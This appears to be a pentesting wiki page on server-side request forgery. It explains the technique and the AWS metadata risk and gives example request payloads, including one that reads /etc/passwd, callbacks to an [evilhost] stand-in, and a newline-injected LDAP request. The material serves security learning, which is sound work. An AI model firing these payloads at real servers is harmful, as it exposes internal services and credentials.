# Server-side request forgery

Server-side request forgery \(SSRF\) exploits the trusted relationship between a web server and other backend systems which are not normally accessible to an attacker \(e.g. because of firewalls or application rules\). They are particularly dangerous in cloud infrastructure like AWS, because SSRF allows an attacker to query internal services like [Amazon's metadata API](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) for credentials and other sensitive data.

## Techniques

### Basic

Generally, you'll be looking for poorly-sanitized parameters which accept URLs, either in `GET` or `POST` requests. In the examples below, `localhost` is used in the URL to access to data and services which are only accessible via the local network.

Example `GET` request with a vulnerable open redirect:

```text
http://[host]/page?url=http://localhost/api/getuser/id/1
```

Example `POST` request with a similarly unsanitized URL parameter:

```text
POST /page HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

url=http://localhost:123
```

Some SSRF attacks will return a response that you can see on the vulnerable website, but others may be blind.

You can also test protocols other than HTTP:

```text
http://[host]/page.php?url=file:///etc/passwd
http://[host]/page.php?dict://[evilhost]:1337/
http://[host]/page.php?url=sftp://[evilhost]:1337/
http://[host]/page.php?url=ldap://localhost:1337/%0astats%0aquit
```

### Attacking AWS with SSRF

Amazon's AWS has an internal metadata service which can be queried from any instance. Attackers can use SSRF vulnerabilities to retrieve instance information and in some cases make changes to the infrastructure. [Amazon's CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-ec2-instances.html) performs a similar function.



## Further reading

* [SSRF: Web Security Academy](https://portswigger.net/web-security/ssrf)
* [SSRF: types and exploits](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
* [SSRF and the CapitalOne breach](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
* [Nimbostratus: tools for fingerprinting and exploiting Amazon](https://andresriancho.github.io/nimbostratus/)
* [SSRF payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

